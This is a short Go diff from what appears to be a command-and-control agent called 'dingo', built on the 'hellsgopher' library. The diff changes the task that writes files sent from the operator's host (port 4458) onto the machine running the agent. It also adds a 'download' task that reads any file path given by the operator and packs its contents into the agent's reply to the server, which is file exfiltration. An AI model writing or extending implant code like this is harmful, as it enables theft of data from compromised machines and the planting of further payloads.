@@ -6,9 +6,9 @@ import (
 	"dingo/tasks"
 	"encoding/json"
 	"fmt"
-	"io"
 	"net/http"
 	"os"
+	"path"
 	"strings"
 
 	hg "github.com/deranged0tter/hellsgopher"
@@ -49,30 +49,24 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 
 			url := fmt.Sprintf("http://%s:4458/files/%s", rhost, uFile)
 
-			// get the data
-			resp, err := http.Get(url)
-			if err != nil {
-				data = err.Error()
-				break
-			}
-			defer resp.Body.Close()
-
-			// create the file
-			outFile, err := os.Create(dPath)
-			if err != nil {
-				data = err.Error()
-				break
-			}
-			defer outFile.Close()
-
-			// write the data to the file
-			_, err = io.Copy(outFile, resp.Body)
+			err := hg.DownFile(url, dPath)
 			if err != nil {
 				data = err.Error()
 				break
 			}
 
 			data = "successfully uploaded file"
+		case "download":
+			data = "successfully download file"
+			data += " //SPLIT// "
+			data += path.Base(taskData)
+			data += " //END NAME// "
+			fileData, _ := hg.ReadFileToString(taskData)
+			data += fileData
+		}
+
+		if !strings.Contains(data, " //SPLIT// ") {
+			data += " //SPLIT// "
 		}
 
 		rawJsonData := tasks.HttpTaskPostRequest{
